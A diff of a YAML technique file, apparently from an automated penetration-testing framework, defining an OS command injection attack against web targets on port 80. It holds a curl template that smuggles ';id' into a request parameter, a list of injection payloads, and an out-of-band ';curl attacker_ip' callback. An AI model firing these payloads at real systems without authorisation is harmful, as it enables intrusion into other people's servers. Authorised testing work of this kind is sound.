@@ -2,15 +2,18 @@ name: command_injection
 category: web
 description: OS command injection exploitation
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}' -d '{parameter}=;id'"
+command_template: curl -s '{target_url}' -d '{parameter}=;id'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Inject OS commands via semicolon, pipe, backtick, $(), or newline. Test: ;id, |id, `id`, $(id). Blind: ;sleep 5 and measure response time. Out-of-band: ;curl attacker_ip."
+mechanism: 'Inject OS commands via semicolon, pipe, backtick, $(), or newline. Test:
+  ;id, |id, `id`, $(id). Blind: ;sleep 5 and measure response time. Out-of-band: ;curl
+  attacker_ip.'
+hacktricks_ref: generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md
